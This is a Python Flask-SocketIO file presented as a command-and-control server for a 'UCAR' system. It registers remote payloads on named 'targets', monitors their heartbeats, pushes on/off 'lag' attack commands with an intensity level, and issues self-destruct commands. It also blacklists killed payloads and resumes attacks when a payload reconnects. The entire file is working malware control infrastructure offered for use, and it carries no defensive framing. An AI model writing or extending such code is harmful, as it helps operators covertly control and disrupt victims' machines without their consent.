# --- START OF FILE app.py ---

# UCAR System: Command & Control Server
# Author: Sigma

import os

# --- EVENTLET CONFIGURATION ---
# If running locally via 'python app.py', we need to monkey patch.
# If running on Render/Gunicorn, this is handled automatically by the worker.
if __name__ == "__main__":
    import eventlet
    eventlet.monkey_patch()

from flask import Flask
from flask_socketio import SocketIO, emit, join_room
import time

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'

# async_mode='eventlet' is required for the lag functionality to handle multiple connections
socketio = SocketIO(app, async_mode='eventlet', cors_allowed_origins="*")

# --- Data Store ---
sessions = {}
blacklist = set()

@app.route('/')
def health_check():
    return "UCAR C2 Server is Operational", 200

def check_offline_sessions():
    """Background task to mark sessions as offline if they miss heartbeats."""
    while True:
        socketio.sleep(10)
        now = time.time()
        changed = False
        for sid, data in sessions.items():
            if data['status'] == 'online' and now - data['last_seen'] > 30:
                sessions[sid]['status'] = 'offline'
                changed = True
        if changed:
            socketio.emit('session_list_update', sessions, namespace='/dashboard')

socketio.start_background_task(check_offline_sessions)

# --- Dashboard Namespace ---

@socketio.on('connect', namespace='/dashboard')
def dashboard_connect():
    """Send current list to dashboard upon connection."""
    emit('session_list_update', sessions)

@socketio.on('update_lag_state', namespace='/dashboard')
def handle_lag(data):
    """
    Receives Lag command from Dashboard (On/Off + Intensity).
    Relays it to the specific Payload.
    """
    sid = data.get('session_id')
    status = data.get('status')
    intensity = data.get('intensity')
    
    if sid in sessions:
        # Update server-side state
        sessions[sid]['lag_status'] = status
        sessions[sid]['lag_intensity'] = intensity
        
        # Send command to the specific payload room
        socketio.emit('command_update_lag', {'status': status, 'intensity': intensity}, namespace='/payload', room=sid)
        
        # Broadcast update to all dashboards (to sync UI)
        emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')

@socketio.on('delete_session', namespace='/dashboard')
def delete_session(data):
    """
    Handles the 'KILL' button.
    1. Blacklists the ID.
    2. Sends self-destruct command.
    3. Removes from session list.
    """
    sid = data.get('session_id')
    
    print(f"Server: Issuing KILL to {sid}")
    blacklist.add(sid)
    socketio.emit('command_self_destruct', {}, namespace='/payload', room=sid)
    
    if sid in sessions:
        del sessions[sid]
        emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')

@socketio.on('update_nametag', namespace='/dashboard')
def update_nametag(data):
    """Updates the display name of a target."""
    sid = data.get('session_id')
    if sid in sessions:
        sessions[sid]['nametag'] = data.get('nametag')
        emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')

# --- Payload Namespace ---

@socketio.on('payload_register', namespace='/payload')
def payload_register(data):
    """Handle new connections from payloads."""
    sid = data.get('session_id')
    if not sid: return
    
    # Check Blacklist (prevent killed payloads from reconnecting)
    if sid in blacklist:
        join_room(sid)
        emit('command_self_destruct', {}, namespace='/payload', room=sid)
        return

    join_room(sid)
    
    # Initialize session data if new
    if sid not in sessions:
        sessions[sid] = {
            'nametag': f'Target-{sid[:4]}', 
            'status': 'online', 
            'last_seen': time.time(), 
            'lag_status': 'off',     # Default to OFF
            'lag_intensity': 5       # Default intensity
        }
    else:
        # If reconnecting, mark online
        sessions[sid]['status'] = 'online'
        sessions[sid]['last_seen'] = time.time()
        
    socketio.emit('session_list_update', sessions, namespace='/dashboard')
    
    # Sync attack state immediately upon connection
    # This ensures if the dashboard left the switch 'ON', the payload resumes immediately.
    emit('command_update_lag', {
        'status': sessions[sid]['lag_status'], 
        'intensity': sessions[sid]['lag_intensity']
    }, namespace='/payload', room=sid)

@socketio.on('payload_heartbeat', namespace='/payload')
def heartbeat(data):
    """Keep-alive signal from payload."""
    sid = data.get('session_id')
    if sid in sessions:
        sessions[sid]['last_seen'] = time.time()
    elif sid in blacklist:
        emit('command_self_destruct', {}, namespace='/payload', room=sid)

if __name__ == '__main__':
    # Running locally
    socketio.run(app, debug=True, port=5000)
